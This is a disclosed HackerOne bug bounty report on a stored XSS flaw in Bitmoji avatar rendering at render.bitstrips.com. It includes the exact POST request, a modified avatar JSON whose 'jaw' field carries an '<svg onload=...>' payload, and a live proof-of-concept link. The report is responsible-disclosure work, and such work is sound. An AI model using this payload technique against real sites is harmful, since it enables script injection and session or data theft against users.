# [render.bitstrips.com] Stored XSS via an incorrect avatar property value

## Report Details
- **Report ID**: 159878
- **URL**: https://hackerone.com/reports/159878
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-16T23:25:17.572Z
- **Disclosed**: 2017-01-04T08:38:41.609Z

## Reporter
- **Username**: s_p_q_r
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: snapchat

## Vulnerability Information
While modifying an avatar, an attacker has the opportunity to submit XSS payloads as its property values. The resulting png file will return a 500 error with the payload in the response body. The response has a **text/html** content type, which makes the XSS attack possible.

**PoC:**

1. Go to https://www.bitmoji.com/account/ and create a new account
2. Choose the avatar style and save it. The following POST request will be sent:

> POST /user/avatar?styles=1,4&app_id=13 HTTP/1.1
> Host: api.bitmoji.com
> 
> avatar_id=%id%&char_data=%data%

3\. Modify the **data** value: set any **pd2** object property value (for example, **jaw**) to **<svg onload=alert(document.domain)>**:

```
{"colours":{},"pd2":{"cranium":"cranium_midstraightmale","forehead":"forehead_standard","hair_back":"hair_back_midstraightmale","hair_front":"hair_front_midstraightmale","hairbottom":"hairbottom_blank","detail_L2_L":"_blank","detail_L2_R":"_blank","jaw":"<svg onload=alert(document.domain)>","beard":"_blank","stachin":"_blank","stachout":"_blank"},"body":{},"style":1}
```

and submit the request again.

4\. Go to your account and click "Edit yor avatar". In your browser web console you will see a https://render.bitstrips.com/render/***/*.png link with a 500 error. Open this link.

The script will be executed.

A PoC link: https://render.bitstrips.com/render/6688424/173752531_2_s1-v1.png

I also recorded a video (see the attachment) of these steps, I hope it will help you reproduce the issue.




## Attachments
- bit_poc.wmv
